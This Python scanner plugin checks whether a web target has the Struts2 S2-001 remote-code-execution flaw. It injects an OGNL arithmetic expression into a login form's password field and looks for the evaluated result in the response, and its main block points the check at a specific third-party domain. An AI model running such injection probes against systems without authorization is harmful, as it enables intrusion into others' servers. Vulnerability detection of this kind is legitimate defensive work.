#!/usr/bin/env python3

import re
from app.lib.utils.request import request

class S2_001_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-001漏洞,又名CVE-2007-4556漏洞',
            'description': 'Struts2 S2-001漏洞可执行任意命令, 影响范围为: WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8',
            'date': '2007-07-16',
            'type': 'RCE'
        }
        self.url = url
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
            'Content-Type': "application/x-www-form-urlencoded",
        }
        self.check_data = {
            'username': 12,
            'password': '%{78912+1235}'
        }
    
    def run(self):
        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """

        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.post(self.url, headers = self.headers, data = self.check_data)
            check_pattern = re.compile('<.*?name="password" value="(.*?)" ')
            check_result = check_pattern.findall(check_req.text)
            if check_result[0] == '80147':
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_001 = S2_001_BaseVerify('http://jsfw.kydls.com')
    S2_001.run()



